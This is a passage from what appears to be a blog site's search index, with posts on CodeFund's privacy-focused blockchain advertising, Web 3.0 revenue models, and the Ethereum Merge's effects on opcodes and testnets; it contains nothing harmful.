services were unable to run successful marketing campaigns. However, the community was generally so niche that most users had a good sense of what they were looking for. The famous cliche, \u201cIf you build it, they will come\u201d is frequently repeated in this space. While it was arguably true for Bitcoin, the internet, and certain decentralized protocols, the data shows that marketing is often crucial for launching a business or community built on top of these networks. Following the launch of Ethereum, the rise of smart contracts, and the ICO mania, things changed. All of a sudden it was relatively easy for startups to launch their own token and rake in millions with a whitepaper. As a result, marketing budgets began to skyrocket and paid campaigns were everywhere due to the (seemingly) huge potential for capital accumulation. While some genuinely revolutionary ideas were started and funded during this time, the vast majority were subpar projects and outright fraudulent scams preying on naive users. At one point Coinmarketcap , a fairly well-regarded website in the crypto space, was showing ads for Bitconnect , a known Ponzi scheme. As a result, most mainstream ad providers like Google and Facebook banned all ads pertaining to crypto. Some people in the blockchain industry thought this was unfair, but it was for good reason. Scammy projects were ruining the public perception of blockchain technology. However, reputable companies were also caught in the crossfire, finding it increasingly difficult to advertise their projects. Notably, Mailchimp\u2019s blockchain ban impacted a project I was working on along with plenty of other startups. I remember when Evan Van Ness \u2019 twitter and Week in Ethereum newsletter (my favorite Ethereum educational resource) were shut down multiple times . So, what\u2019s the solution? Fortunately, the majority of mainstream advertising services have relaxed their bans on blockchain advertising in the face of a maturing ecosystem. This is especially interesting when considering that both Google and Facebook have announced their foray into the industry. Existing Blockchain Advertising Obstacles \u00b6 We recently released a blog post covering a variety of different free and paid channels to advertise your blockchain startup. And although there are more options than ever, there are still several obstacles to overcome. As we appear to be approaching the next bull market, scams will undoubtedly come back (I\u2019ve already seen a huge uptick in the \u201cfree crypto\u201d scams on twitter). Further, the crypto ecosystem hasn\u2019t addressed the problems of mass data collection and rampant user profiling in the Adtech world. Most of us believe blockchain will be the catalyst for a revolution of privacy and self-sovereign identity, hopefully breaking up the big data monopolies of web2. Yet the entrepreneurs and thought leaders pushing this narrative of individual autonomy and privacy in the digital age are still using advertising services that track, profile, and collect mass amounts of data from their target markets. Marketing is inevitable - startups need to reach their desired audience and grow a user base. But can this be done in a more ethical way, in line with the ethos of this technology we love and support? Enter: CodeFund \u00b6 While all of this craziness was happening in the blockchain world, Eric Berry was focused on tackling a different problem: The Open Source Conundrum . Open source software lays the foundation for the Internet as we know it and supports so much of our global business processes, yet comparatively receives very little support and funding. How can we help open source projects and maintainers get consistent financial support? Eric founded Code Sponsor 2 years ago , allowing companies to place small text-based sponsored messages on GitHub project READMEs to support open source software. Since then he\u2019s been threatened with legal action, shut down, started again, rebranded to CodeFund, and eventually joined the Gitcoin team at ConsenSys , who share the same mission: get developers paid . At CodeFund , we pride ourselves on showing ethical ads on developer websites, acknowledging and respecting individual privacy. This means that our ads do not track, use cookies, nor collect any data except for IP addresses and browser agents. We feel ads that track our browsing history and know our personal information are an invasion of privacy, and from our research, the majority of our user base feels the same way. So while we can't profile and target specific demographics and individuals, we can help you tailor your ads to the desired audience and display them on sites that your audience frequents with geotargeting. Users will see ads that they actually want to see without compromising their data, browsing history, or personal information. CodeFund is 100% open source (feel free to contribute! \ud83d\ude04) and was built by developers for developers, so we understand the motivations of our users. We keep our content relevant by only showing high-quality ads from companies that are of interest to the audience. We diligently vet all advertisers and publishers to make sure they are a good fit for the network. By understanding the community and showing them ads relevant to their interests, you build trust between your advertisers, publishers, and most importantly, users. The CodeFund model is a bit unorthodox in the Adtech world. However, we find it to be extremely successful in our niche (and growing) open source community. Developers are typically much more likely to use ad blockers compared to typical Internet users. Developers are also known to be more concerned about privacy and data collection. For these reasons, they can often be hard to reach with advertising. To get your message seen, you need reputable publishers who are trusted by their audience. CodeFund is bound by the standards set by acceptable ads , which means many ad blockers do not block us. We work with our users to allow our ads and make sure they are relevant to the audience, ensuring all parties involved are benefiting. We believe the future of the web will be a privacy-focused, user-driven evolution . More scandals are emerging from large corporations revealing data mismanagement, leaks, and hacks of sensitive information. Digital advertising will never go away, but the average internet user is becoming more security and privacy conscious, and we think this will lead to an increased demand for ethical advertising products. That's why we built a platform to allow advertisers to get their message to the right audience without compromising user integrity. Ethical Ads for Blockchain - Why Target Crypto Users? \u00b6 Initially CodeFund was not focused on the blockchain space, however, since joining Gitcoin , we\u2019ve been expanding our offerings. We realized that ethical advertising is going to play a crucial role in Web3, blockchain, open source, and the future of the Internet - and that's something we want to support. Blockchain technology was undeniably born out of the open source ecosystem. While the two communities are not exactly the same, they share many morals and have significant overlap. By nature, blockchain and cryptocurrencies would be useless if they were not open source. A key feature of decentralized cryptocurrencies is that there is no need to trust an intermediary and no barriers to entry. For it to work, anyone must be able to run, review, and contribute to the code. Today's leading blockchains are a cumulation of hundreds, if not thousands of individuals contributing to open source code bases. Just like most developers, blockchain users and enthusiasts tend to be much more privacy conscious than a typical Internet user. As a result, CodeFund's ethical ad model is a great fit, not only for blockchain developers but also for blockchain users. CodeFund ensures that the blockchain projects we work with are building applications and tools for open source blockchains, primarily for Ethereum. We don\u2019t work with projects pumping their own token sales, instead, we partner with blockchain companies that are adding value to society and the open source ecosystem . CodeFund\u2019s Blockchain Offerings \u00b6 For the next few months, CodeFund will be actively building out our blockchain publisher and advertiser networks. We are currently publishing ads on Etherscan , State of the Dapps , Etherchain , Decrypt Media , Coingecko , and a handful of other high-quality blockchain websites - with even more in the pipeline. Decrypt just release a great piece on the problems with crypto \u201cnews\u201d sites, and their motivations for advertising ethically. Our advertisers like Truffle are happy with their results so far and have seen high conversion rates from their campaigns, without sacrificing the privacy and integrity of their audience. Crypto markets are beginning to turn around, more startups are shipping products, and the global blockchain community is growing. We expect this trend to continue, driving the demand for blockchain advertising as a result. Many blockchain websites publishing ads see it as a necessary evil \u2013 they need to keep the lights on to continue providing their services, but feel their choices are limited. The first option is working with companies to run direct advertising campaigns. However, this approach consumes time and resources and can be risky if advertisers pull out. The second option, and perhaps the easiest, is to use Google Ads or another incumbent service. Using this approach, many feel they\u2019re compromising users\u2019 privacy and trust. Moreover, outsourcing to huge Adtech giants is part of the problem that made ICO scams so rampant in 2018-2019. These companies simply have far too much traffic and lack the specialized skill set required to manually vet every single advertiser and identify blockchain scams. The last thing publishers want on their website is an ad that loses your users' money or promotes the purchasing of unregistered securities. At Gitcoin and CodeFund, we are a small team that has been in the blockchain world for years. We view every publisher and advertiser as a partner, diligently vet them, and hold them to the highest standards. We\u2019d like to see ethical advertising become the new standard in the blockchain space, and eventually on the Internet as a whole. If your blockchain company is interested in advertising to a high-quality audience, or you would like to earn passive income showing relevant ads on your website without sacrificing your community\u2019s privacy, CodeFund is for you! Apply now on the CodeFund landing page and we\u2019ll be in touch, or reach out to connor@codefund.io for more information.", "title": "How Ethical Advertising Will Transform the Blockchain Industry"}, {"location": "blog/how-ethical-advertising-will-transform-the-blockchain-industry/#the-conflicting-relationship-between-blockchain-and-marketing", "text": "In the initial years following Bitcoin\u2019s inception, most blockchain companies didn\u2019t need paid advertising. The early adopters were a community of cypherpunks, libertarians, developers, miners, and hobbyists, that truly believed in the power of decentralized networks. To them, adoption was inevitable, and rather than putting paid ads in front of the general public, resources were better spent building wallets, development tools, infrastructure, and scalability solutions. Additionally, almost all early blockchain users and entrepreneurs were extremely privacy-conscious. Pseudonymity is a key component to cryptocurrencies, they wouldn\u2019t work in a permissionless manner without it. The Adtech industry, on the other hand, is run by monolithic centralized powerhouses that gather and store immense amounts of personal data for precise targeting. For the first 5 years of Bitcoin, the blockchain community ethos was quite literally the polar opposite of the advertising industry . That\u2019s not to say that in the early days exchanges, wallets, and other blockchain services were unable to run successful marketing campaigns. However, the community was generally so niche that most users had a good sense of what they were looking for. The famous cliche, \u201cIf you build it, they will come\u201d is frequently repeated in this space. While it was arguably true for Bitcoin, the internet, and certain decentralized protocols, the data shows that marketing is often crucial for launching a business or community built on top of these networks. Following the launch of Ethereum, the rise of smart contracts, and the ICO mania, things changed. All of a sudden it was relatively easy for startups to launch their own token and rake in millions with a whitepaper. As a result, marketing budgets began to skyrocket and paid campaigns were everywhere due to the (seemingly) huge potential for capital accumulation. While some genuinely revolutionary ideas were started and funded during this time, the vast majority were subpar projects and outright fraudulent scams preying on naive users. At one point Coinmarketcap , a fairly well-regarded website in the crypto space, was showing ads for Bitconnect , a known Ponzi scheme. As a result, most mainstream ad providers like Google and Facebook banned all ads pertaining to crypto. Some people in the blockchain industry thought this was unfair, but it was for good reason. Scammy projects were ruining the public perception of blockchain technology. However, reputable companies were also caught in the crossfire, finding it increasingly difficult to advertise their projects. Notably, Mailchimp\u2019s blockchain ban impacted a project I was working on along with plenty of other startups. I remember when Evan Van Ness \u2019 twitter and Week in Ethereum newsletter (my favorite Ethereum educational resource) were shut down multiple times . So, what\u2019s the solution? Fortunately, the majority of mainstream advertising services have relaxed their bans on blockchain advertising in the face of a maturing ecosystem. This is especially interesting when considering that both Google and Facebook have announced their foray into the industry.", "title": "The Conflicting Relationship Between Blockchain and Marketing"}, {"location": "blog/how-ethical-advertising-will-transform-the-blockchain-industry/#existing-blockchain-advertising-obstacles", "text": "We recently released a blog post covering a variety of different free and paid channels to advertise your blockchain startup. And although there are more options than ever, there are still several obstacles to overcome. As we appear to be approaching the next bull market, scams will undoubtedly come back (I\u2019ve already seen a huge uptick in the \u201cfree crypto\u201d scams on twitter). Further, the crypto ecosystem hasn\u2019t addressed the problems of mass data collection and rampant user profiling in the Adtech world. Most of us believe blockchain will be the catalyst for a revolution of privacy and self-sovereign identity, hopefully breaking up the big data monopolies of web2. Yet the entrepreneurs and thought leaders pushing this narrative of individual autonomy and privacy in the digital age are still using advertising services that track, profile, and collect mass amounts of data from their target markets. Marketing is inevitable - startups need to reach their desired audience and grow a user base. But can this be done in a more ethical way, in line with the ethos of this technology we love and support?", "title": "Existing Blockchain Advertising Obstacles"}, {"location": "blog/how-ethical-advertising-will-transform-the-blockchain-industry/#enter-codefund", "text": "While all of this craziness was happening in the blockchain world, Eric Berry was focused on tackling a different problem: The Open Source Conundrum . Open source software lays the foundation for the Internet as we know it and supports so much of our global business processes, yet comparatively receives very little support and funding. How can we help open source projects and maintainers get consistent financial support? Eric founded Code Sponsor 2 years ago , allowing companies to place small text-based sponsored messages on GitHub project READMEs to support open source software. Since then he\u2019s been threatened with legal action, shut down, started again, rebranded to CodeFund, and eventually joined the Gitcoin team at ConsenSys , who share the same mission: get developers paid . At CodeFund , we pride ourselves on showing ethical ads on developer websites, acknowledging and respecting individual privacy. This means that our ads do not track, use cookies, nor collect any data except for IP addresses and browser agents. We feel ads that track our browsing history and know our personal information are an invasion of privacy, and from our research, the majority of our user base feels the same way. So while we can't profile and target specific demographics and individuals, we can help you tailor your ads to the desired audience and display them on sites that your audience frequents with geotargeting. Users will see ads that they actually want to see without compromising their data, browsing history, or personal information. CodeFund is 100% open source (feel free to contribute! \ud83d\ude04) and was built by developers for developers, so we understand the motivations of our users. We keep our content relevant by only showing high-quality ads from companies that are of interest to the audience. We diligently vet all advertisers and publishers to make sure they are a good fit for the network. By understanding the community and showing them ads relevant to their interests, you build trust between your advertisers, publishers, and most importantly, users. The CodeFund model is a bit unorthodox in the Adtech world. However, we find it to be extremely successful in our niche (and growing) open source community. Developers are typically much more likely to use ad blockers compared to typical Internet users. Developers are also known to be more concerned about privacy and data collection. For these reasons, they can often be hard to reach with advertising. To get your message seen, you need reputable publishers who are trusted by their audience. CodeFund is bound by the standards set by acceptable ads , which means many ad blockers do not block us. We work with our users to allow our ads and make sure they are relevant to the audience, ensuring all parties involved are benefiting. We believe the future of the web will be a privacy-focused, user-driven evolution . More scandals are emerging from large corporations revealing data mismanagement, leaks, and hacks of sensitive information. Digital advertising will never go away, but the average internet user is becoming more security and privacy conscious, and we think this will lead to an increased demand for ethical advertising products. That's why we built a platform to allow advertisers to get their message to the right audience without compromising user integrity.", "title": "Enter: CodeFund"}, {"location": "blog/how-ethical-advertising-will-transform-the-blockchain-industry/#ethical-ads-for-blockchain-why-target-crypto-users", "text": "Initially CodeFund was not focused on the blockchain space, however, since joining Gitcoin , we\u2019ve been expanding our offerings. We realized that ethical advertising is going to play a crucial role in Web3, blockchain, open source, and the future of the Internet - and that's something we want to support. Blockchain technology was undeniably born out of the open source ecosystem. While the two communities are not exactly the same, they share many morals and have significant overlap. By nature, blockchain and cryptocurrencies would be useless if they were not open source. A key feature of decentralized cryptocurrencies is that there is no need to trust an intermediary and no barriers to entry. For it to work, anyone must be able to run, review, and contribute to the code. Today's leading blockchains are a cumulation of hundreds, if not thousands of individuals contributing to open source code bases. Just like most developers, blockchain users and enthusiasts tend to be much more privacy conscious than a typical Internet user. As a result, CodeFund's ethical ad model is a great fit, not only for blockchain developers but also for blockchain users. CodeFund ensures that the blockchain projects we work with are building applications and tools for open source blockchains, primarily for Ethereum. We don\u2019t work with projects pumping their own token sales, instead, we partner with blockchain companies that are adding value to society and the open source ecosystem .", "title": "Ethical Ads for Blockchain - Why Target Crypto Users?"}, {"location": "blog/how-ethical-advertising-will-transform-the-blockchain-industry/#codefunds-blockchain-offerings", "text": "For the next few months, CodeFund will be actively building out our blockchain publisher and advertiser networks. We are currently publishing ads on Etherscan , State of the Dapps , Etherchain , Decrypt Media , Coingecko , and a handful of other high-quality blockchain websites - with even more in the pipeline. Decrypt just release a great piece on the problems with crypto \u201cnews\u201d sites, and their motivations for advertising ethically. Our advertisers like Truffle are happy with their results so far and have seen high conversion rates from their campaigns, without sacrificing the privacy and integrity of their audience. Crypto markets are beginning to turn around, more startups are shipping products, and the global blockchain community is growing. We expect this trend to continue, driving the demand for blockchain advertising as a result. Many blockchain websites publishing ads see it as a necessary evil \u2013 they need to keep the lights on to continue providing their services, but feel their choices are limited. The first option is working with companies to run direct advertising campaigns. However, this approach consumes time and resources and can be risky if advertisers pull out. The second option, and perhaps the easiest, is to use Google Ads or another incumbent service. Using this approach, many feel they\u2019re compromising users\u2019 privacy and trust. Moreover, outsourcing to huge Adtech giants is part of the problem that made ICO scams so rampant in 2018-2019. These companies simply have far too much traffic and lack the specialized skill set required to manually vet every single advertiser and identify blockchain scams. The last thing publishers want on their website is an ad that loses your users' money or promotes the purchasing of unregistered securities. At Gitcoin and CodeFund, we are a small team that has been in the blockchain world for years. We view every publisher and advertiser as a partner, diligently vet them, and hold them to the highest standards. We\u2019d like to see ethical advertising become the new standard in the blockchain space, and eventually on the Internet as a whole. If your blockchain company is interested in advertising to a high-quality audience, or you would like to earn passive income showing relevant ads on your website without sacrificing your community\u2019s privacy, CodeFund is for you! Apply now on the CodeFund landing page and we\u2019ll be in touch, or reach out to connor@codefund.io for more information.", "title": "CodeFund\u2019s Blockchain Offerings"}, {"location": "blog/how-the-arrival-of-web-3-0-is-transforming-traditional-business-models/", "text": "Although the Internet continues to drive digital transformation, the technology operates far beyond its original parameters. Since its inception over two decades ago, the web has been subject to increasing levels of centralization and mass surveillance. As a result, large corporations, governments, and media outlets remain the primary beneficiaries of an infrastructure meant to serve all of humanity. Herein lies the problem with the current Internet ecosystem, also known as Web 2.0. In the current online environment, users continually function as commodities, generating value along with their data. And while large entities should not shoulder the blame for their role in our everyday lives, their control over our personal information is cause for concern. As Internet founder Tim Berners-Lee once said , \"for people who want to make sure the Web serves humanity, we have to concern ourselves with what people are building on top of it.\" It is precisely this sentiment that drives the Web 3.0 movement. And although blockchain technology may be the foundation of this movement, the initiative is much broader. Web 3.0 is about building a decentralized infrastructure that protects individual property and privacy. But what exactly does this look like and what are the potential implications? In this article, we'll explore the evolution of Internet infrastructure and how the arrival of Web 3.0 is impacting existing business models. The Evolution of Web Infrastructure \u00b6 The Internet debuted employing simplistic \"read-only\" technology, meaning users were only able to search for information and read it. This Web 1.0 environment was primarily intended for advertising purposes, acting as an extension of physical storefronts. With the arrival of \"read-write\" functionality, users of Web 2.0 are able to create their content and interact with the Internet in a far deeper capacity. By facilitating the prolific growth of social media platforms, blogs, and online reviews, this infrastructure continues to guide global business models. However, as mentioned, this era of robust growth has not come without consequences. Consumer protections continue to rank behind corporate interests as web surveillance fuels lucrative data collection. Continued data breaches effectively highlight the downside of this arrangement. In response to these challenges, Web 3.0 initiatives aim to put power back into the hands of users. But before exploring how this will occur, it's crucial to understand the specific Web 3.0 characteristics that will facilitate this process. Characteristics of Web 3.0 \u00b6 Although Web 3.0 is difficult to define in exact terms, it can be effectively broken down into unique components. Semantic Web \u00b6 The semantic web improves upon existing web infrastructure by generating, sharing, and connecting content based on an understanding of words. Rather than relying on keywords and numbers, search and analysis utilize context. Source: The Semantic Web Stack Connectivity Thanks to semantic metadata, Web 3.0 achieves greater connectivity. By leveraging all available information, the user experience dramatically improves. Artificial Intelligence \u00b6 Web 3.0 technology can process information in a way similar to humans. As a result, platforms can better satisfy user needs through continuous learning. 3D Capabilities \u00b6 Three-dimensional design is already in use on many Web 3.0 platforms. Computer games, e-commerce applications, and mapping software represent only a few potential use cases. Ubiquitous \u00b6 In the decentralized Web 3.0 environment, all content is accessible by multiple applications, every device connects to the web, and the associated services are available everywhere. Web 3.0 and Existing Business Models \u00b6 Although we have only just begun to explore the potential of Web 3.0 applications, their ability to upset the status-quo is undeniable. Of particular interest to many is how decentralized projects, operating in traditional industries, will up-end conventional revenue models. Through utilizing distributed, peer-to-peer platforms, some industries have begun to consider other funding options. Although there is a vast array of revenue models to consider, we\u2019ll explore some of the most prominent options here. To see the full list, check out the Github repository . Revenue Share \u00b6 The revenue share model uses profits to enable separate actors to develop efficiencies or innovate in mutually beneficial ways, such as splitting earnings. Percentage Fee \u00b6 This model is where you take a percentage of each transaction executed on your platform. It remains a popular model with exchanges and marketplaces. The seller usually pays for the fee since they're the one that benefits from completing a sale on the platform. Income Share \u00b6 Using this model, users share earnings from another entity. An offline example would be a restaurant where the cashier shares the tips with everyone. In the context of Web 3.0, you could give a one-dollar tip in a coffee shop and split it with every actor in the coffee value chain with minimal transaction costs. ICO\u2019s \u00b6 Conducting an ICO is the process of selling project tokens all at once, or over some time. There are several ICO models and token variations that companies can use to raise funds. Continuous Funding Models \u00b6 Continuous Funding Models are business models that sell ERC-20 tokens over time, rather than all at once. Curved Bonding \u00b6 Curved Bonding is a method of continuous funding that incentivizes early investment. In contrast to conventional ERC-20 token sales and ICO's, which feature each token being sold for the same price (no matter the time of purchase), such models hardcode buy prices according to an algorithmic curve. By purchasing early, investors get more tokens for the same price than if they are buying later. Ultimately, using Curved Bonding incentivizes early adopters to invest in a token. Continuous Organizations \u00b6 A continuous organization is one that sets up a Decentralized Autonomous Trust (DAT). This trust is an immutable smart-contract that implements curve bonding to automatically mint, burn, and distribute security tokens called FAIR securities. Organizations provide value to the trust by diverting part or all of their cash flow to it. Streaming Money \u00b6 Side Channels \u00b6 A sidechain is a separate blockchain that is attached to its parent blockchain using a two-way peg. Using this model, you can move assets to the sidechain and then back to the parent chain. However, sidechains also need their miners. These miners receive an incentive through 'merged mining,' whereby two separate cryptocurrencies, based on the same algorithm, are mined simultaneously. State Channels \u00b6 State channels are mostly two-way pathways open between two users that want to communicate with each other in the form of transactions. Here, only the outcome needs to be included in the form of a single transaction on the main chain. Other transactions occur on off-chain. The Future of Internet Infrastructure \u00b6 As the development of Web 3.0 technology persists, blockchain technology will remain a vital component of online infrastructure. Although the world continues to benefit from the transformative power of the web, user empowerment remains a priority among a growing segment of society. In a time when centralized institutions and governments exert control over personal data, many have begun to challenge the status quo. Those exploring this emerging subset of the web are well-positioned to benefit from growing momentum. By leveraging Web 3.0 technologies, companies also have the ability to enact new, potentially lucrative business models. Regardless of the industry, the new web presents an opportunity to pivot from traditional revenue streams in search of more optimal solutions. In the midst of ongoing innovation, it\u2019s important to note that all new technology requires refinement - and Web 3.0 is only just beginning.", "title": "How the Arrival of Web 3.0 is Transforming Traditional Business Models"}, {"location": "blog/how-the-arrival-of-web-3-0-is-transforming-traditional-business-models/#the-evolution-of-web-infrastructure", "text": "The Internet debuted employing simplistic \"read-only\" technology, meaning users were only able to search for information and read it. This Web 1.0 environment was primarily intended for advertising purposes, acting as an extension of physical storefronts. With the arrival of \"read-write\" functionality, users of Web 2.0 are able to create their content and interact with the Internet in a far deeper capacity. By facilitating the prolific growth of social media platforms, blogs, and online reviews, this infrastructure continues to guide global business models. However, as mentioned, this era of robust growth has not come without consequences. Consumer protections continue to rank behind corporate interests as web surveillance fuels lucrative data collection. Continued data breaches effectively highlight the downside of this arrangement. In response to these challenges, Web 3.0 initiatives aim to put power back into the hands of users. But before exploring how this will occur, it's crucial to understand the specific Web 3.0 characteristics that will facilitate this process.", "title": "The Evolution of Web Infrastructure"}, {"location": "blog/how-the-arrival-of-web-3-0-is-transforming-traditional-business-models/#characteristics-of-web-30", "text": "Although Web 3.0 is difficult to define in exact terms, it can be effectively broken down into unique components.", "title": "Characteristics of Web 3.0"}, {"location": "blog/how-the-arrival-of-web-3-0-is-transforming-traditional-business-models/#semantic-web", "text": "The semantic web improves upon existing web infrastructure by generating, sharing, and connecting content based on an understanding of words. Rather than relying on keywords and numbers, search and analysis utilize context. Source: The Semantic Web Stack Connectivity Thanks to semantic metadata, Web 3.0 achieves greater connectivity. By leveraging all available information, the user experience dramatically improves.", "title": "Semantic Web"}, {"location": "blog/how-the-arrival-of-web-3-0-is-transforming-traditional-business-models/#artificial-intelligence", "text": "Web 3.0 technology can process information in a way similar to humans. As a result, platforms can better satisfy user needs through continuous learning.", "title": "Artificial Intelligence"}, {"location": "blog/how-the-arrival-of-web-3-0-is-transforming-traditional-business-models/#3d-capabilities", "text": "Three-dimensional design is already in use on many Web 3.0 platforms. Computer games, e-commerce applications, and mapping software represent only a few potential use cases.", "title": "3D Capabilities"}, {"location": "blog/how-the-arrival-of-web-3-0-is-transforming-traditional-business-models/#ubiquitous", "text": "In the decentralized Web 3.0 environment, all content is accessible by multiple applications, every device connects to the web, and the associated services are available everywhere.", "title": "Ubiquitous"}, {"location": "blog/how-the-arrival-of-web-3-0-is-transforming-traditional-business-models/#web-30-and-existing-business-models", "text": "Although we have only just begun to explore the potential of Web 3.0 applications, their ability to upset the status-quo is undeniable. Of particular interest to many is how decentralized projects, operating in traditional industries, will up-end conventional revenue models. Through utilizing distributed, peer-to-peer platforms, some industries have begun to consider other funding options. Although there is a vast array of revenue models to consider, we\u2019ll explore some of the most prominent options here. To see the full list, check out the Github repository .", "title": "Web 3.0 and Existing Business Models"}, {"location": "blog/how-the-arrival-of-web-3-0-is-transforming-traditional-business-models/#revenue-share", "text": "The revenue share model uses profits to enable separate actors to develop efficiencies or innovate in mutually beneficial ways, such as splitting earnings.", "title": "Revenue Share"}, {"location": "blog/how-the-arrival-of-web-3-0-is-transforming-traditional-business-models/#percentage-fee", "text": "This model is where you take a percentage of each transaction executed on your platform. It remains a popular model with exchanges and marketplaces. The seller usually pays for the fee since they're the one that benefits from completing a sale on the platform.", "title": "Percentage Fee"}, {"location": "blog/how-the-arrival-of-web-3-0-is-transforming-traditional-business-models/#income-share", "text": "Using this model, users share earnings from another entity. An offline example would be a restaurant where the cashier shares the tips with everyone. In the context of Web 3.0, you could give a one-dollar tip in a coffee shop and split it with every actor in the coffee value chain with minimal transaction costs.", "title": "Income Share"}, {"location": "blog/how-the-arrival-of-web-3-0-is-transforming-traditional-business-models/#icos", "text": "Conducting an ICO is the process of selling project tokens all at once, or over some time. There are several ICO models and token variations that companies can use to raise funds.", "title": "ICO\u2019s"}, {"location": "blog/how-the-arrival-of-web-3-0-is-transforming-traditional-business-models/#continuous-funding-models", "text": "Continuous Funding Models are business models that sell ERC-20 tokens over time, rather than all at once.", "title": "Continuous Funding Models"}, {"location": "blog/how-the-arrival-of-web-3-0-is-transforming-traditional-business-models/#curved-bonding", "text": "Curved Bonding is a method of continuous funding that incentivizes early investment. In contrast to conventional ERC-20 token sales and ICO's, which feature each token being sold for the same price (no matter the time of purchase), such models hardcode buy prices according to an algorithmic curve. By purchasing early, investors get more tokens for the same price than if they are buying later. Ultimately, using Curved Bonding incentivizes early adopters to invest in a token.", "title": "Curved Bonding"}, {"location": "blog/how-the-arrival-of-web-3-0-is-transforming-traditional-business-models/#continuous-organizations", "text": "A continuous organization is one that sets up a Decentralized Autonomous Trust (DAT). This trust is an immutable smart-contract that implements curve bonding to automatically mint, burn, and distribute security tokens called FAIR securities. Organizations provide value to the trust by diverting part or all of their cash flow to it.", "title": "Continuous Organizations"}, {"location": "blog/how-the-arrival-of-web-3-0-is-transforming-traditional-business-models/#streaming-money", "text": "", "title": "Streaming Money"}, {"location": "blog/how-the-arrival-of-web-3-0-is-transforming-traditional-business-models/#side-channels", "text": "A sidechain is a separate blockchain that is attached to its parent blockchain using a two-way peg. Using this model, you can move assets to the sidechain and then back to the parent chain. However, sidechains also need their miners. These miners receive an incentive through 'merged mining,' whereby two separate cryptocurrencies, based on the same algorithm, are mined simultaneously.", "title": "Side Channels"}, {"location": "blog/how-the-arrival-of-web-3-0-is-transforming-traditional-business-models/#state-channels", "text": "State channels are mostly two-way pathways open between two users that want to communicate with each other in the form of transactions. Here, only the outcome needs to be included in the form of a single transaction on the main chain. Other transactions occur on off-chain.", "title": "State Channels"}, {"location": "blog/how-the-arrival-of-web-3-0-is-transforming-traditional-business-models/#the-future-of-internet-infrastructure", "text": "As the development of Web 3.0 technology persists, blockchain technology will remain a vital component of online infrastructure. Although the world continues to benefit from the transformative power of the web, user empowerment remains a priority among a growing segment of society. In a time when centralized institutions and governments exert control over personal data, many have begun to challenge the status quo. Those exploring this emerging subset of the web are well-positioned to benefit from growing momentum. By leveraging Web 3.0 technologies, companies also have the ability to enact new, potentially lucrative business models. Regardless of the industry, the new web presents an opportunity to pivot from traditional revenue streams in search of more optimal solutions. In the midst of ongoing innovation, it\u2019s important to note that all new technology requires refinement - and Web 3.0 is only just beginning.", "title": "The Future of Internet Infrastructure"}, {"location": "blog/how-the-merge-impacts-the-application-layer-and-developer-experience/", "text": "By Kingsley Arinze The Merge is scheduled to happen between the 13th and 15th of September and once complete, Ethereum would no longer run on PoW, but a PoS consensus mechanism that promises to reduce its carbon footprint by 99.95%. This blog is the third part of a 3-part Truffle series on the Ethereum Merge, where we explain its impact on our suite of tools. If you haven\u2019t already, please checkout the previous post as they provide more context on the topic of the Merge The Merge and what it means for Truffle Preparing for the Merge, hear from our Truffle engineers While in the previous blogs we touched on what the Merge means for Truffle, what steps we are taking to prepare, and how if affects our suite of tools and users, in this blog our focus is on the changes PoS brings to Ethereum\u2019s application layer and developer experience by exploring opcode changes, testnets, and how Truffle users can have a seamless transition. Opcode changes \u00b6 Smart contract developers usually rely on the 0x44 opcode, known as DIFFICULTY for obtaining some form of randomness in their smart contracts, which makes sense as this field returns the block difficulty in the PoW Ethereum. With the switch to PoS, this field would no longer return anything meaningful as there is no concept of block difficulty in PoS. In order to provide some form of backward compatibility and prevent smart contracts that use block.difficulty from breaking, the value returned by the DIFFICULTY opcode will be replaced with the pseudo-random value generated as part of the Beacon Chain and would be renamed PREVRANDAO . It should be noted that although this new PREVRANDAO value is considered as a source of randomness output of a higher strength than the output provided by the DIFFICULTY opcode in the PoW network, it is still not a true source of randomness the same way block.difficulty is not and should be used with care while adhering to the instructions outlined in the EIP under security considerations . Testnets \u00b6 If you\u2019ve been a part of the Ethereum ecosystem long enough, you\u2019ve noticed that with significant changes to the network like the Merge comes changes to testnets. If you\u2019re interested in understanding the journey so far and how the testnet landscape has changed over the years, check out this blog on The history of the Ethereum testnets . So far, we\u2019ve seen the deprecation of two popular testnets within the dapp developer ecosystem: Rinkeby and Ropsten. We\u2019ve also seen the deprecation of the Kiln testnet, which was initially setup for testing the Ethereum network post-merge. Although these networks have been deprecated and developers are advised not to use them moving forward, they are still up and running to allow enough time for users to transition, with the timelines for their complete shut down outlined here With Rinkeby, Ropsten, and Kiln deprecated, it frees up capacity and time for client developers to focus and provide long-term support for the two long-lived testnets going forward, Goerli and Sepolia. Dapp developers can access these testnets during development via Truffle Ganache , including the ability to fork them. These networks are also fully supported by Infura , the leading Ethereum node provider, so please check out the documentation to better understand how it works. Seamless transition to PoS \u00b6 Since the start of the Merge, one goal that has remained constant for Truffle from a developer perspective is how seamless the transition from PoW to PoS is going to be. The Merge is designed to have very little impact on existing applications and developer tools by supporting backward compatibility as much as possible. At Truffle, we\u2019re excited about a PoS future for Ethereum and cannot wait for its full actualization, as well as the further performance and scalability improvements it sets the foundation for. You can hear directly from our engineers on what the Merge means for us and how we\u2019ve prepared for it . Ready. Set. Merge! \u00b6 As you can see, the Merge does impact the Ethereum application layer, even though in a minimal way. It introduces some opcode changes that dapp developers should be aware of when building on a PoS blockchain. It also introduces some changes to the developer tooling, most notable is the deprecation of popular testnets Rinkeby and Ropsten and the introduction of the new testnet Sepolia. To stay up to date with the Merge and how we are preparing for it at Truffle, subscribe to the Truffle newsletter by visiting our website today. We also hold monthly live streamed sessions called Web Unleashed , where we build, interview folks, and discuss important developments around the ecosystem. Keep an eye on our Twitter for updates on the next session. You can also find past episodes on the Truffle Youtube channel and the unleashed section of our website if you prefer written materials.", "title": "How the merge impacts the application layer and developer experience"}, {"location": "blog/how-the-merge-impacts-the-application-layer-and-developer-experience/#opcode-changes", "text": "Smart contract developers usually rely on the 0x44 opcode, known as DIFFICULTY for obtaining some form of randomness in their smart contracts, which makes sense as this field returns the block difficulty in the PoW Ethereum. With the switch to PoS, this field would no longer return anything meaningful as there is no concept of block difficulty in PoS. In order to provide some form of backward compatibility and prevent smart contracts that use block.difficulty from breaking, the value returned by the DIFFICULTY opcode will be replaced with the pseudo-random value generated as part of the Beacon Chain and would be renamed PREVRANDAO . It should be noted that although this new PREVRANDAO value is considered as a source of randomness output of a higher strength than the output provided by the DIFFICULTY opcode in the PoW network, it is still not a true source of randomness the same way block.difficulty is not and should be used with care while adhering to the instructions outlined in the EIP under security considerations .", "title": "Opcode changes"}, {"location": "blog/how-the-merge-impacts-the-application-layer-and-developer-experience/#testnets", "text": "If you\u2019ve been a part of the Ethereum ecosystem long enough, 